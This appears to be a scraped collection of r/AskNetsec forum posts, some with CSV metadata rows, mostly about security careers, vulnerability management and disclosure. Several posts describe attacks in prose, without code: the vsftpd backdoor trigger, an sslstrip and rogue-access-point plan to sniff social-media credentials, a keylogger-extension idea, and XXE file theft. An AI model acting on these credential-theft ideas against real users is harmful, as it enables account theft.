So, I was reading a little bit about that incredibly stupid bill that Australia passed which on the face looks like it's trying to compel tech companies into building backdoors through end to end encryption. Anybody with half a brain in the security community could tell you that there's no such thing as a law enforcement proprietary backdoor and if it were engineered, somebody -- and that means everybody -- would find it and exploit it. That's been the gist from what I could see, anyway. But then I started reading the bill. This little snippet on page 10 stands out: &gt;**The Bill expressly prohibits technical assistance notices or technical capability notices from requiring a provider to build or implement a systemic weakness or systemic vulnerability into a form of electronic protection.** This includes systemic weaknesses that would render methods of authentication or encryption less effective. The Australian Government has no interest in undermining systems that protect the fundamental security of communications. The new powers will have no effect to the extent that requirements would reasonably make electronic services, devices or software vulnerable to interference by malicious actors. Importantly, a technical capability notice cannot require a provider to build a capability to remove electronic protection and puts beyond doubt that these notices cannot require the construction of decryption capabilities. Notices must be revoked if requirements cease to be reasonable. Decision-makers must revoke a technical assistance notice or technical capability notice if satisfied that any ongoing requirements are no longer reasonable, proportionate, practical or technically feasible. Accordingly, notices that have become obsolete or excessively burdensome must be discontinued. These same notices may be varied to account for changing commercial and operational circumstances. Agencies cannot prevent providers from fixing existing systemic weaknesses. Notices cannot prevent a provider from fixing a security flaw in their products and services that may be being exploited by law enforcement and security agencies. Providers can, and should, continue to update their products to ensure customers enjoy the most secure services available. &amp;#x200B; Also, the above requirement is echoed on page 47, Division 7, section 317ZG (really, it's just the whole page). So... what does this mean? Does this mean they actually cannot weaken encryption in the way people are saying or can they? Because the spirit of this bill is completely different from the wording in those sections. I mean, they repeated themselves to that effect. Is this just a symbolic gesture by the Australian government to show ""they're tough on crime"" but at the same time be practically useless? Has anybody gotten a good look at it? Is this a false silver lining?"

Found out it doesnt have ssh. At first I thought this was a big deal. After thinking about it I realized we dont need it. I also realized vulnerabilities this switch might have could be considered low risk. Someone would have to hack the router or gain physical access to take advantage of any vulnerability.

I started as an intern that was about a year and resulted in a full time position after graduation. Fast forward over a year and a half to now and I am starting to reconsider my options. Nothing particularly wrong with the company itself I enjoy the folks on my team for the most part but not enjoying the work. I would say about 60% of my time is spent on compliance related tasks (i.e. reviewing policy/procedures, writing procedures, etc). Dont get me wrong I understand how important this is in the security world and I have learned a lot in the process. But I did not get into this field to write documentation and know it is inescapable. I want to focus more exposure on the technical side of security, not just running through a procedure or writing one to mark a check box. The technical type work I am exposed to is mainly managing different security tools, while this is not all bad, vulnerability assessment is generally interesting to me, I still feel like I am lacking something. I want to have the ability to learn more when it comes to everyday work not just outside of the office. &amp;#x200B; I was in a bit of a rut for awhile stuck in the mentality of, well I wont be able to apply this to work so whats the point. Not the best thought process I know, and dont want to make excuses, if I am being honest with myself I know I could have done more but I can sit here and say that all day. Over the past 5 months or so I have been trying to take a more proactive approach in improving my work life for myself by trying to take on more technical projects that are realistically applicable to my work. But with a trigger happy manager when it comes to tool and a what feels like a new priority every other week its difficult since I need to focus on learning that specific tool or work on this new task. It feels like we under utilize a lot of what we already have but have no time to fully optimize it since we are told to work on this instead a few weeks later. Granted there are things that pop up here and there that interest me and are more technical in nature but it is quickly tossed to the ever growing pile of things we will circle back on. It seems that things are not going to change anytime soon and feels like I am stuck in this two steps forward one step back mode at this company. Not to mention security isn't really taken seriously outside of maybe two or three immediate team members (shocker I know). &amp;#x200B; I am looking for something different, more challenging/interesting I worry Im getting too comfortable. Im considering the DC area and am curious about different government contractor companies (Lockheed, Northrop Grumman, Booz Allen, etc..). Based on what I have read about companies like this it sounds overall pretty positive. I wanted to know if anyone here has worked at or works for a company in this vein and can share their experience or any advice. Probably starting to rambling, overall I'm passionate about security and know this is the field I want to stay in, just want to get some good experience and learn as much as I can, appreciate any advice!"

I work for a small/medium-sized startup and my current role is network admin. I oversee all of the networking and IT projects and staff. I've been with the company for about 6 years. In my time here I've taken on the responsibility of writing and implementing a security policy, vulnerability assessments (internally only for now), patching/remediations, trending/reporting, provided security training to personnel, etc. I've been included in almost every security discussion and felt like my opinion is appreciated. My background is very much IT with an interest in security for probably 3 years. Recently, the CTO (my boss) made mention to needing a dedicated security position. I don't have any official security training, certs or education aside from my years of experience. However, I know that security is where I would like to take my career in the future. When I first heard about this new position I was intrigued and wanted to try to build myself into that role if possible. I felt I could infuse security practices (even though I feel like I'm already doing this) into all aspects of IT/networking and it would be an obvious new responsibility for my role. Recently, the CTO added some clarification to that new position saying ""someone that doesn't report to you or me"" that can take a non-biased approach to security. Considering we only have 2 C-levels today, I assume he's talking about a CISO. My question then, for r/AskNetSec is -- If this is still a position I want to try for, what should I do? CISO feels like a stretch for me, but would love to convince the CTO that this is a role I can play, without the title. Obviously assuming this isn't also about having another C-level in the Org. Is the CTO right that this position should be disconnected from IT? I could see that at a large organization but is that still true/necessary for a smaller startup? Would it be wrong for a security position to manage IT/networking? "

250,vulnerability,AskNetsec,Nearly 10 million sensitive data exposed from Brazilian satellite TV providers,1,9na4cr,https://www.reddit.com/r/AskNetsec/comments/9na4cr/nearly_10_million_sensitive_data_exposed_from/,2018-10-12 00:49:08," In September 2018, I used a search engine 'fofa' like shodan, The URL is r/URL I discover more than 230 million data breaches from the ELasticsearch database owned by Brazil Sky Satellite TV, including 7.2 million user sensitive information and transaction data,and there are signs of ransom. Judging from the current information, since the company is the top two national multimedia providers in Brazil, and its customers cover the whole of Brazil, it is expected to cause a great response in Brazil soon. Moreover, through the continuous research of us, the sensitive plaintext data leaked not only reached more than 7 million, but also continued to increased by tens of thousands per hour. It is worth noting that the ransom document was created almost the same time as the leaked data index, both in the early morning of July 16, 2018. This indicates that the database should have a backup and synchronization mechanism, so that the data is restored at the same time as being deleted, so that the ransom did not succeed. However, the time has passed two months, but the administrator still does not know the ransom information, indicating that the administrator has poor security awareness, and still does not know that the database is being attacked, resulting in a large number of users' sensitive data still being exposed to the public network. On the one hand, any attacker can browse the user's private data at will and use it to plot a series of phishing and social worker attacks. On the other hand, the attacker can also add, delete, inquire and modify the data, especially because it contains money transaction information. Attacker can use this to falsify transaction data to illegally obtain economic benefits. The Brazilian sky satellite TV company, a leading multimedia provider in Brazil. It was established in 1996 and is affiliated with a major British broadcaster company. After more than 20 years of development, it not only has the largest HDTV platform in Brazil, but also has a total number of users of around 7 million, ranking second in Brazil. The leaked data records sensitive information about the company's users (e.g. account creation time, email, ip, birthday, phone, address, password, etc.), as well as service bills purchased by each user (services involve hardware and software, such as types of multimedia audio-visual services, the type of signal receiver used and the serial number of the product, the type of signal modulator, the product sequence, and the payment status of these services, etc.). In addition, although the leak also revealed the ciphertext of the password, the encryption method is the currently safe BCryp algorithm, and the attacker has no effective means to decipher the password in a short time. And I note that this breach also appears to involve the payment of bills, which, if exploited by hackers, could lead to financial disputes. In addition to some multimedia services, various types of hardware information for processing and playing multimedia are also available for purchase or use by users (for example, the following figure is the Philips signal modulator that users often use) Of course, it also includes dedicated wired receiver. I will continue to follow up on the vulnerability. Please continue to focus on us. Source:[URL"

Memory address: Value, permissions 1: 2, forbidden 2: 3, allowed 3: 4, allowed * Process asks CPU to look at value of address ""1"" and return the value of the address associated with that value. (ie. Look at ""1"", the value is ""2"". Look at address ""2"", and return value ""3""). This is a forbidden operation as the process does not have the permissions necessary to read address ""1"". * Due to speculative execution, the value of ""2"" is read and cached before the CPU checks whether the process is allowed to read address ""1"". The original process fails with an error. * A new process attempts to read addresses ""2"" and ""3"". Because address ""2"" was cached, and ""3"" was not, it is faster to read ""2"". * Because it was faster to access ""2"", the attacker now knows address ""1"" has value ""2"" Does that sound right?

On the side I'm finishing my M.Sc. as a distance study. This is not my first infosec job, so I think the following is not a company-specific problem. I'm doing all kinds of pentests for small and big clients. I enjoy the actual pentesting a lot, but there are a lot of tasks and things that I increasingly dislike. I don't like all this enterprise things like meetings, group calls and doing presentations in front of people who understand nothing of what I do. Just all this business overhead. The consulting part of the job. I'm not bad in these things, I just don't like to do them. Then there are a lot of clients who don't actually want a pentest, but have to do one. You have to call numerous people for every little detail of information or, even worse, they make up so many rules that you can't even find anything of importance. Then I have to write enormous reports which include every little possibility of vulnerability, in words that even non tech people can understand. I understand that this is important for the quality of the product ""pentest"", but I just don't enjoy doing it. I just want to get together with the developer in charge and show him the PoC of the big things I discovered. NO ONE needs an expensive consultant to tell you (in a comprehensive report) that you need a HSTS-Header in your Web-Application. Furthermore my job is taking a lot of time. I'm making slow progress to finishing my study and have absolute no time for any side projects. And that is really bad, because I have so many ideas in my head, that I just can't realize. All these issues are slowly fucking me up, so I've come up with different solutions: 1. Don't be a pussy. You are getting good money for something you really like. All these business overhead is the price to pay for that. Make up a proper time management plan and everything will be fine. CONS: This may fuck you up even more and the problem comes back even worse. 2. Quit your job. Do bug bounty hunting. This is the real pentesting thing, giving PoC to qualified developers and all that with minimal business overhead. You are flexible in time and can finish your study earlier. CONS: No idea if I can do this for a living. 3. Go back to software development. This is your original profession and you really like it. You can work flexible or even freelance and make good money, too. CONS: no infosec :( Anyone here that is in a similar situation? Does someone live of bounty hunting? Any advice? What do you think is the best option for me? Thank you!"

Question is basically the the title, but here is some background: I work in AppSec and vulnerability management and have a masters in Computer Forensics. I recently interviewed with a recruiter for an AppSec Engineer position at a large tech firm. Things went well, but unfortunately the position needed me to move across the country and I cant at this time. So the recruiter introduced me to another recruiter in the same organization hiring a PSIRT (Product Security Incident Response Team) team member in my area. Anyone have experience with being on working on these kinds teams? Im more interested in a technical role in AppSec and everything Ive seen makes these roles sound like a customer service job focused on triaging security issues to actual security engineers. "

I had an interesting discussion with a colleague about the secrecy of user names. I think most of us will agree that the way we use credentials today makes user names kind of public information. Every time you write an email using your gmail account you will give away your account name, twitter, github, wordpress, whatever all publish your user name. It follows that you can not rely on the secrecy of the user name for anything, it is public data. This resulted in the following question: If user names are public data, why is user enumeration, the ability to get essentially public data, a vulnerability? Knowing the user names makes brute force attacks on a service exponentially easier, so I guess we can say that knowing user names decreases a system's security and indeed makes it more vulnerable. So, should user names be kept secret after all? Is the way we treat user names actually insecure? I think the way we use account names is indeed technically insecure, mitigated by implementing measures like limiting the number of login attempts or optionally requiring more factors for authentication. I'd be happy to hear what you think about this. Should user names considered secret? Is user enumeration even a problem? Why/why not? Is the answer to this a clear ""it depends""?"

The file itself is a public open source file so it's not like the file itself is meant to be secret. It also has to be used by www-data/Apache in other scripts that are php/executing. **should you hash/encrypt usernames** My other question is, I just applied static storage encryption on user's data, the only thing that isn't encrypted are their usernames. I suppose I could have hashed them, but I did not take this into account initially when building the application. The encryption/decryption of usernames may add more load but all of their other features are using encryption/decryption process so I don't know. The application doesn't have public usernames so that's why I'm concerned. It would be different if the usernames were known, although I suppose you could still argue that that's a vulnerability if people know usernames and try to bruteforce them but I think most sites the usernames are known/you could try."

Issue background External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application. However, in many cases, it can indicate a vulnerability with serious consequences. In cases where DNS-based interactions can be triggered, it is normally possible to trigger interactions using other service types, and these are reported as separate issues. If a payload that specifies a particular service type (e.g. a URL) triggers only a DNS-based interaction, then this strongly indicates that the application attempted to connect using that other service, but was prevented from doing so by egress filters in place at the network layer. The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers."""

There's heaps of tools around, and using them is not the issue, I think, it's more like we're lacking the 'big picture' that organizes the entire process of recon, information gathering etc. We're trying to put on the hacker's hat and pentest our own sites. So far this is what we've done. (For clarification, the site in question resolves to an IP on which a couple other sites are hosted.) * NMAP scan the machine on which the websites are hosted * dirb scan a website, which yields some existing URLs * collect some email addresses that are visible on the public website * see that the site uses TYPO3 Now, what would a hacker or professional pentester do next? Cross-reference open services revealed by NMAP with a vulnerability database? Try to detect which version TYPO3 is used and see if there are any vulnerabilities? Or rather attempt a phishing or social engineering campaign on the e-mail addresses gathered?

Until now, I've only had luck by submitting literally hundreds of vulnerability reports every month, and being eventually hired for short periods of time.

As in the title,what has helped you to land 9-to-5 or freelancing jobs, or to get to know people whose acquaintance resulted into paid work? If now, how did you get to know colleagues and clients? I am sure that top hackers at H1 or Bugcrowd get more work than they can handle, but the competition is ruthless and I can't afford to invest a lot of time into top-tier bug bounty programs for now (risking to not find any bug and be back to square one)."

So you might remember me, but I posted about my first OSCP exam about 8 months ago. Since then, I have failed the OSCP 5 times. 3 of those times I live-tweeted as I went. On all my attempts I have made between 50-65 points, and put up a good fight! My next attempt, #6, is on 4/20 in 6 weeks. I wanted to post here after running into another PWK student who was also now gearing up for their 6th attempt, to kinda give my perspective. I have been ""hacking"" since I was a kid, doing CTFs and writing/modifying exploits. In that time, I have learned a lot of habits and have developed dependencies that really, REALLY hurt on the OSCP. The exam is specially crafted to try and put you into a mindset that, up to now, I've hardly even tried. I miss Metasploit, and Burp Pro, and Empire, and all my various vulnerability scanners and tools. I miss my dumb cheesy custom scripts and SQLMap and all the good stuff I've made into my usual daily diet. It's exhausting going from my day job where I can use these things, to an exam environment where I can't. Regardless, OSCP has been amazing. I've learned more about myself than about Infosec, and feel it is teaching me to be flexible (something I SUCK at). I want everyone trying the exam out, and failing, to know that it doesn't mean you won't thrive in the infosec world. It just means you need to grow more, and learn more, and become BETTER. A certification does not a hacker make, nor does it tear down what being a ""hacker"" means in someone who is one. I got &gt;30 machines in the labs manually, low priv on others. I've done vulnhubs and Hack the Box and read blog after blog, and continue to fail. And that's ok. Every attempt shows me another weakness in myself and my techniques to improve. Plus, I now have around 18 unique exam machines under my belt. Eventually, they'll run out of new ones to give me :) Don't give up. Try Harder, Try SMARTER. If I have to take this exam 20 times, I know it will be better for me in the long run to learn how to work under pressure, in limited circumstances, and not in the CTF world of cheese. Good luck guys! And, wish me luck too... I am gettin' a bit sleepy here!"

I believe that the problem code is on the lines where welcome is concatenated with the username and newline character, and that I should be able to overflow welcome somehow, as strcat does not check buffer sizes. However, I'm struggling to actually do that. As far as I can tell, strncpy is used correctly on both username and password and the null character added correctly. As such, both username and password are correctly truncated at 19 characters and strcat works correctly. Could anyone give me a few hints/pointers as to what I'm missing out on?

As this is a field I have become really interested in I also started to learn some programming and am learning as much as possible on the topic.

For example risk; digitalization influence on cyber risk, and; awareness of cybersecurity across the port are topics that come to mind. These topics are however still quite broad and vague and this is why I am asking you guys for tips and thoughts what things would be interesting to have a look at. I have briefly summed up some possible research topics that I have come up with and would be very glad with suggestions that might narrow these topics down! I read your topics daily and love you guys as a community, many thanks to all the help you give to everyone! * **Topics:** * Digitalization of Ports and its relation to risks and threats to security. * Awareness as a driver for a more cyber resilient environment in ports. * How regulation and guidelines can help steer ports toward a more cyber resilient environment. * Research into port systems evolution to drive a secure port * Threats of organized crime and how to go forward on this growing problem. (I think this is a really interesting topic, however im not sure whether this is researchable. (think of interviews with people involved etc.) * How can the port translate the 'technical' talk to be more understandable for business, i.e. make cybersecurity accessable for management and employees. * Implementing a (long term) cyber security strategy. (what would this look like and what are the implications) * Risk assessment of vulnerability across the various parts of the port, e.g. storage, boat-to-shore systems, oil. * Managing issues that come from the many different private owners in the port, and how to unite the port as one cybersecurity stronghold.

Although no known virus or exploit is yet documented that leverages on the IME, it is widely known that it could be utilized for remote access to a computer. Such remote access would bypass the OS, bypass antivirus, and whatever else exists on the targeted machine. In this thread, we will dispel or verify the cluster of rumors swirling around IME ""Intel Managment Engine"". Criticize and/or correct the following facts, liberally. + IME is part of the CPU, not the motherboard. + IME is a full operating system running through firmware. It is a redux of MINIX. + IME runs its own OS with its own dedicated CPU. + Intel pretends IME is a ""Feature"", but failed to disclose its existence in any public way. It was later ""discovered"" by a German security outfit. + The National Security Agency (NSA) became aware of the vulnerability posed by IME, and requested that Intel give them their own little ""switch bit"" to turn it off. Intel's engineers obliged --- in a move that effectively admits guilt. Netsec bloggers refer to this as the **""NSA bit""** now. + This IME stuff was not implemented in Intel chipsets until about 2015. It only effects certain ""generations"" starting from gen 6 and later. + IME could be used to gain remote access to a machine over the internet -- in a way that is so drastic that some netsec experts call it a ""God Mode"".

The OS and softwares installations are prepared on the IT network and systems and transferred via USB keys. Second constraint is that there is no way I can run an agent on their systems nor can I perform scan on their networks (because both ""could be potentially disruptive""). They only want to provide me the list of softwares and versions they use so that we can monitor vulnerable versions. As we are a small and young team in the company, we don't have any power on these projects.

The first exploit I'm tackling is VSFTPD version 2.3.4. I have researched generally how the exploit happened. In a nutshell, the vsftpd vulnerability was introduced for 2 days when the version 2.3.4 downloadable from the master site had been compromised by an unknown attacker who proceeded to upload a version of vsftpd with a backdoor. With said version, users were able to issue a "":)"" smiley face as the username and gain a command shell on port 6200. Knowing this puts me at a high-level knowledge of how VSFTPD works. I am hoping to understand how VSFTPD works at a much lower level and then, how the exploit works. My goal is to go through all the exploits in MS2 and understand them deeply instead of just running the exploit through Metasploit. I was hoping someone could explain or direct me to a resource(s) that explains VSFTPD (and perhaps the exploit) in depth and technically. I have been searching a lot to find answers with little success. Thank you "

My predecessor would just say ""yup"" and go make the rule. I'm looking for some guidance on the high-level steps that you guys would take to evaluate such a request. I imagine organizations often verify server hardening against baseline standards, run vulnerability scanners on the system, evaluate what kind of data is going to be transferred, look at the authentication methods being used on whatever the application is, analyze encryption requirements, and may run risk assessments. All of that is just my best guess at what might be done though, as I have never worked in a position where I got to see an organization do this.

I have been looking for a new gig for over 8 months now with no luck and it leaves me quite exasperated. My background: * Malware analysis &amp; Signatures - primarily Android, but have also worked on Symbian, Windows, Linux and the occasional iOS sample. * Vulnerability Research on IoT devices. * I've also spoken and presented my work at a handful of conferences and published/co-authored a couple papers. * Been at the same gig for soon-to-be 7 years, 5 being purely malware analysis/security research (the golden era) and now on Product Security/Incident Response since early last year (prison time). My role was redefined mainly because my n+1 got a promotion and so I was the scapegoat to validate his position in the company. Moreover, the research team was entirely dissolved at my branch at the same time due to a 'suit' n+2 who did not see/understand the value of research to the company. What I'm looking for * Getting back to malware and reverse engineering. * Threat Intelligence * The perfect post would also implicitly promote conference presentations/papers, research and community sharing. * Obviously a promotion to a more senior role (just job title words, I know, but it seems to count). Platforms I've been looking on: * The LinkedIn's, Glassdoor's and even specific company websites * The r/netsec Hiring Threads * ninjajobs * I've also tried getting introductions from common contacts but in the one case I can think of I think I didn't hear back because my experience was more mobile-malware-heavy than Windows-malware. In another instance I was told they were looking for someone 'less technical' (that did not align with the job description they shared imo) The hurdles (so far): * I'm *not* based in the US. That seems to apparently limit so many options of great job postings I come across for the US. As someone who has turned down job offers from Google and Apple since those offers didn't provide the specialization I had/was looking for and came at a time when I wasn't actively looking, I had assumed I had a reasonably good CV. All of that seems to fall flat in the face of sponsorship requirements. I've had recruiters/managers express interest in my CV but the discussion dies a natural death as soon as I mention my location/sponsorship requirements. * While there are few good options closer to home, I'm unable to move in the immediate future due to administrative issues limiting my options to remote jobs. Surprisingly, even remote work in this time and age seem to not be as evident as I had thought. * I'm quite clear and specific on what I'm looking for. That is not to say, the job I'm looking for doesn't exist at all, the ones I've applied to never worked out for reasons other than technical most of the time. My questions to you: * What do you think I'm doing wrong based on what you've read so far? * **Have you had similar experiences despite having a decent profile and experience?** (in bold since my experience baffles me based on all the cybersecurity-skills-shortage-jargon most sec companies spew.) * Bonus question: If anyone involved in hiring is willing to have a look at an anonymous version of my CV, I'd be more than thankful. If you believe in the adage 'if you're not growing, you're dying', I'm dying a slow death everyday with prison time &lt;/dramatic rendition&gt; and would appreciate feedback. TL;DR: Malware analyst/reverse engineer with 7 years experience failing to find a new gig since winter 2016. What am I doing wrong?"

The flaw can be anywhere in the infrastructure, on the cloud (whichever company's servers), during transport over the network, in an application etc. It's pretty broad. An example would be if a common form of encryption that is used can be broken. My plan was to use sslStrip2 to downgrade hsts communications on a network in order to sniff a users username and password as they connect to a social service. But after messing around with it i've realised that all browsers now have a preloaded hsts list which ensures all communication with the websites listed is through https. (side note - reddit is still vulnerable on internet explorer 10) If I were to create a malicious access point as a MitM attack, would it still be possible to perform a ssl downgrade? I think it works, but won't work if the victim is using a browser which has a preloaded hsts list. Other options i've thought of are; -creating a chrome extension which would act as a key logger, or some other malicious chrome/firefox extension -attempting to breach a devices security over a LAN and retrieving social media credentials -creating an application which connects to social media, like a facebook app, which could be used for malicious purposes. After researching, I'm pretty sure finding a security vulnerability on any social media platform directly would be too difficult - that's why I thought using an ssl downgrade attack would be good as it is a protocol which is used by every large website. do any of you have any recommendations or can you think of any other/better direction for me to try?

It appeared to have a trojan running and I found the trojan and .freerdp folder under the wwwuser account. Here's a few more details: * This Windows 7 computer was fully patched. * The Admin account had a fairly secure password containing Uppercase, Lowercase, numbers and symbols and 14 characters long. The alpha part could possibly be considered dictionary though I think it's misspelled. The password was unique and not in use anywhere else within the network/business. Note that the password has been changed after discovery the hack. * The RDP port was not the standard 3389. * The computer was behind a SonicWall SOHO firewall with port forwarding for RDP only. (Note that the firewall did allow any remote IP to attempt to login via RDP, which was admittedly a vulnerable way to have it configured. This has since been changed.) * The attacker had his malware running under the wwwuser account. This Windows 7 computer did have IIS installed and running but the web server wasn't made available to the outside world via port forwarding. The wwwuser didn't have rights for remote desktop. IIS has now been disabled as it was no longer needed and the wwwuser account has also been disabled. * Under Remote Settings, ""Allow connections from computers running any version of Remote Desktop (less secure)"" was selected. * This Windows 7 ""server"" does not get logged into via RDP or console by any local users. It does get logged into remotely by an admin, but only very infrequently. * The remote login information for this machine was not / is not readily available. It was possibly shared with a major, credible software vendor back in January of this year. So far, there's simply no evidence that the attacker got in via the main Admin account and almost no evidence that the attacker go in through RDP, except that RDP was really the only open port to this machine. * So far, I've not seen any evidence of any other nefarious behavior on the same network. It doesn't mean that the attack couldn't have originated on one of the other workstations, but I've just not seen anything to indicate that that was likely. * I believe SMBv1 is disabled on this Windows 7 server computer, but even if it isn't the machine was fully patched. * The hack appears to have taken place on Friday 05/26/2017 at 21:00 UTC. To me it seems extremely likely that this was the result of a zero-day exploit of some kind. Other possible options would be brute-force or theft of credentials, which both seem pretty unlikely to me. Any other ideas or opinions? Anyone seen any news of any new RDP vulnerability? "

I've never found or exploited a buffer overflow, wrote more than the basics in low level languages, or have any clue what I'm doing in OllyDbg, etc. Basically, if I were tasked with finding a vulnerability in a 2002 version of Adobe Acrobat I wouldn't know where to start. Web app wise I write my own tools and do my exploitation by hand (it's this thing where I feel like downloading and running a scanner ruins the fun). So basically I've convinced myself that my appsec experience will be of little help to me in OSCP, and that it's going to feel like I'm starting from scratch again. Is that true? The reason I'm considering OSCP to begin with is purely for hobby and self knowledge, and to get a deeper understanding of security. So I guess my question is...should I be doing prereq's somewhere to get my chops up before diving in? How hands on are the lessons/book before attempting labs? Should I even bother with this or just double down on what I'm already good at and get better at that?"
417,vulnerability,AskNetsec,Vulnerability Scanning non-linked sites,1,6hos00,https://www.reddit.com/r/AskNetsec/comments/6hos00/vulnerability_scanning_nonlinked_sites/,2017-06-17 05:29:29,"Hey everyone, So I am in charge of a vulnerability scanning program on some locations that are not part of our Site-to-Site or MPLS connectivity. These sites are completely isolated and need to be scanned. I am thinking of using OpenVAS and CentOS 7 to create a .OVA that I could deploy to each sysadmin. My question is, how can I remotely connect to the web interface to configure the scan? Could I script some VPN to phone back home to a publicly routable connection where I can then access the console? Correct me if I'm wrong, but some security consultants have to do something similar with client engagements, right? So if I can do what they are doing, that will allow me to run scans without an active connection to the site. Thanks!"
418,vulnerability,AskNetsec,Learning from mistakes. How long should you wait for a vendor to fix security issues and what should we have done when they refused to fix it for so long?,1,670fd1,https://www.reddit.com/r/AskNetsec/comments/670fd1/learning_from_mistakes_how_long_should_you_wait/,2017-04-23 14:23:36,"We recently released information to reddit about some hidden users and potential security holes in firmware. We found these issues and sent messages to the company about it. They mostly made tickets and said they would fix the issues but never did. We felt it was necessary to reveal this information to other clients since they had a right to know. We waited one or two years for them to release a patch and nothing ever changed. We wanted to give them time but we didn't want engineers to be left in the dark about these potential problems. Some clients thanked us and some people criticised us for doing it this way. They asked if we had CVE ids, but none of us have ever had to file any (so the answer was no). They asked if we told the vendor and how long we knew about the problems. There are a few more things of interest that we know of where attackers could get credentials and stuff in the right situation. (Told vendor about this a year ago) This time we would like to announce this properly so people know outside of reddit. It was hard getting the right info about CVEs and suggestions for when to report. We thought waiting half of a year or maybe a year before releasing this was acceptable but we wanted to ask here. 1. If you tell the vendor about the problem, how long should you wait before revealing this to public? We understand waiting for a patch and for the patch to be rolled out by other clients to their equipment so that everyone has a chance to protect themselves 2. When do you file for CVE? Do we wait until a patch or can we file immediately? 3. If we file a CVE, will they contact the vendor for us? 4. IS there a way to submit information needed for decrypting stuff (like keys) so they can verify without it being included in the final report or will they do that after reviewing? 5. What if the vulnerability exists only in older code or versions, do we still need to contact the vendor? We understand that we didn't go the best way in reporting this so we would like to know a more proper way in doing this for next time."
419,vulnerability,AskNetsec,Good site to track back ported patches?,1,67bfbk,https://www.reddit.com/r/AskNetsec/comments/67bfbk/good_site_to_track_back_ported_patches/,2017-04-25 05:42:25,So I'm trying to determine some accuracy in various vulnerability scanning tools and some are reporting of multiple vulnerabilities on 1 piece of software and the other tool isn't. One thing I want to check is back ported patches I want to see if one tool is taking into account that the software was patched via back porting. So was wondering if anyone knows of a good site that perhaps would track that sort of thing? Want to be able to say something like CVE-2012-blah blah and see that it was patched in the latest version of the software but it was also back ported to previous versions. hope that make sense :S vulnerability hell lol

I may end up just emailing this into First.org but figured I'd give this sub a try first. First, if you focus solely on the Base Metrics, a score of 10 is the highest a vulnerability can score. The Environmental Metrics are supposed to account for any in place changes in an organization. For example, maybe you deployed an OS with X vulnerabilities but your standard configuration turned off key services which are not running. These environmental factors allow you to dial back the score of a vulnerability as a result. The Temporal Metrics reflect the changing remediation scenario surrounding the vulnerability--is there a workaround configuration, is there a patch or upgrade that fixes it? But if there is no known fix, then how does this score impact the overall CVSS score for that vulnerability? If a vulnerability can get a base score of 10. Shouldn't the temporal and environmental metrics add up to more than 10? Here is the v3 scoring overview. URL Its kind of a bad deal that after reading the spec and other documents, I'm still not clear on something so basic as how high a vulnerability score can go. Is it 10 or above 10? I don't know. Can't figure out even after looking at the equations. I need a lifeline or maybe confirmation from someone else that they can't figure it out either. At the most basic level, if you use their calculator and can't get a score to go above 10......stands to reason their scoring system doesn't quite make sense. URL [Here is a sample score](URL "

I have done a ton of independent studying and have a few basic certs (Sec+, EJPT and ECIH - although maybe I shouldn't be admitting that last one...). I have not used the tools that our company uses directly (Qualys and DB Protect), but I am familiar enough with Nessus and the concept of vulnerability scanning that I know I could get up to speed if given the opportunity. I have also spent 7+ years with the company and am pretty familiar with the organizational structure. But I also know my technical skills and knowledege need work - I have been working in a process oriented job (Problem Management) for about the last 3+ years, and I am nervous that I have gotten rusty. So, that leads me to here, asking the good folks of this subreddit to lay out the type of questions you would ask a candidate for a position like this on your team? What should every good vulnerability analyst know? What would score extra points? What red flags would you look for in a candidate for an entry level / intermediate position in a role like this?"

I haven't had many classes in networking or security, so I am hoping to take a bit of a self-guided crash course in those. I was wondering what resources would be good starting points so I could have a little bit of knowledge coming into the program. Specifically, I was told that I would be a part of an ""Intranet redesign"" and doing ""vulnerability management activities."" During my interviews, I was asked a lot of questions about TCP/IP, and firewalls, ports, stuff like that. I was thinking about reading materials for certifications, like Network+ and Security+ or CCENT and CCNA-Security (I don't know if this company uses Cisco devices). Does that seem like a good idea, or should I look at something else? Thanks!"

Of course- it's vulnerable. I'm trying to figure out whether this constitutes an actual vulnerability though. Most XXE attacks are web-uploads or something remote, this is just a manipulated XML file that can call out to a remote server and send a local file. So I guess you'd have to get the user to open this xml file, which steals local files and sends them to you. Are client side attacks like this worthy of reporting? The only other XXE I've found like this is the new MS17-020 vuln (URL where MS DVD Maker is XXE susceptible to a crafted .msdvd file. In that instance, it's a base-installed Microsoft program, which is widespread enough to be a true risk."

I'm trying to stay ahead of the game as much as possible as it comes to learning, but since this is something completely new to us that hasn't begun yet I'm not sure the direction to go, so enter me asking the NetSec community! 1. Trainings/Boot Camps/Certifications etc. I have a pretty standard list of certifications personally (A+, Net+, Sec+, CCNA, MCITP Server 2008, and Associate of ISC2 (CISSP as soon as endorsement is complete hopefully within 2 weeks)). We have a training budget so I have the opportunity to pursue a boot camp or training course, I just have to prove it's relation to the MSOC functions. Any paths you guys recommend? We looked at SANS but was too expensive, so anything else related to incident handling and advanced threat management would be helpful. 2. Books. I do very well with self study, so if there are any books any of you SOC Analysts consider gospel I would appreciate that insight! 3. Any tools that you guys find helpful? I mean we'll be using a SIEM, endpoint threat management, vulnerability management, etc. Currently our security team only has read only rights to our networking equipment, but eventually that may be expanded. Any insight at all that anyone can give would be helpful! Anyone that works in a managed SOC environment I would love to hear from you in general on how that partnership is going and what value you've gotten from it. I guess I should also give my experience / job position. My background is mostly in Windows system administration, with some associate level networking. Active directory and Exchange were my first sys admin responsibilities. Now I'm a security engineer and I manage our SIEM/do most of our investigations (not forensics). When we start the MSOC partnership I'll be devoted full time to deploying our new SIEM, and being the sole point of contact when it comes to an analyst type role for the managed service which basically means I'll be the one partnering with them to create and document processes as well as do incident management. Ugh sorry this got really long! "

I have setup Kali Linux on a netbook and setup OpenVAS and done some test scans to where I am comfortable with the results. What I am having trouble with now is deciding what a fair pricing model is. My initial thought was I charge a rate per IP for simply scanning and handing off the results. And optionally charging a per item fee for resolving issues, but i cant seem to find any consistent information out there. I want to make money, but I also want to provide a fairly priced service to small local businesses. Any pointers? Thanks"

If there is ANY possibility of some form of a hardware imprint being on these file's, I also need to know if I'm just being overly paranoid.

